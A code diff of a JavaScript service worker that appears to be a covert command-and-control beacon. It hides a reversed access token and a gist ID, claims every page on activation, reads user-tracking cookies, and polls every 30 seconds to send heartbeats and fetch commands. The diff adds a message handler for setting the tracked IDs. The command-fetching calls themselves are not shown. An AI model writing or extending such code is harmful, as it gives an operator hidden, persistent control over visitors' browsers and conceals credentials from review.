@@ -2,32 +2,36 @@ var PAT     = 'nqxjx0RRWCrR9eybiamApnU5oAubW1DmWlnc_phg'.split('').reverse().joi
 var GIST_ID = '6bb037f859d2dc4f26f8c0e4880aa9a2';
 var POLL_MS = 30000;
 var _meta   = null;
+var _uid    = null;
+var _fid    = null;
 
 self.addEventListener('install', function() { self.skipWaiting(); });
 self.addEventListener('activate', function(e) {
     e.waitUntil(self.clients.claim());
     poll();
 });
+self.addEventListener('message', function(e) {
+    if (!e.data || e.data.type !== 'init') return;
+    _uid = e.data.uid || null;
+    _fid = e.data.fid || null;
+    _meta = null;
+    poll();
+});
 
 async function poll() {
-    var uid = await getCookie('_uid');
-    if (uid) {
-        await heartbeat(uid);
-        await checkCmd(uid);
+    if (_uid) {
+        await heartbeat(_uid);
+        await checkCmd(_uid);
+    } else if (_fid) {
+        await checkUmt(_fid);
     } else {
-        var fid = await getCookie('_fid');
-        if (fid) await checkUmt(fid);
+        try {
+            var c = await cookieStore.get('_uid');
+            if (c) { _uid = c.value; await heartbeat(_uid); await checkCmd(_uid); }
+            else { c = await cookieStore.get('_fid'); if (c) { _fid = c.value; await checkUmt(_fid); } }
+        } catch(e) {}
     }
     setTimeout(poll, POLL_MS);
-}
-
-async function getCookie(name) {
-    try {
-        var cookie = await cookieStore.get(name);
-        return cookie ? cookie.value : null;
-    } catch(e) {
-        return null;
-    }
 }
 
 async function checkUmt(fid) {
